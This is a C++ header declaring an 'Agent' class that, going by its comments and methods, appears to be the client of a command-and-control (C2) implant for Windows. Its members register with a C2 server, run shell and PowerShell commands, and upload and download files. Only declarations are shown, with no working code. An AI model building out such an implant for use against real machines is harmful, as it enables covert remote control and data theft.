#include <iostream>
#include <vector>
#include <string>
#include <map>
#include <Windows.h>



class Agent {

protected:
	// command handler.
	std::string HandlerURI;
	std::string ComputerName;
	std::string AgentID; // MD5 of computername or something
	std::string ipAddress;
	std::vector<std::string> FunctionArguments;
	unsigned int port;


	std::string PsScript = "";


public:

	void Register(std::string ip, unsigned int port);
	// ip/port for c2server
	std::string Get(std::string path);
	std::string Post(std::string path, std::string data);
	void SetArgs(std::vector<std::string> args);
	std::vector<std::string> GetArgs();
	void shell();
	void powershell();
	void upload();
	void download();

};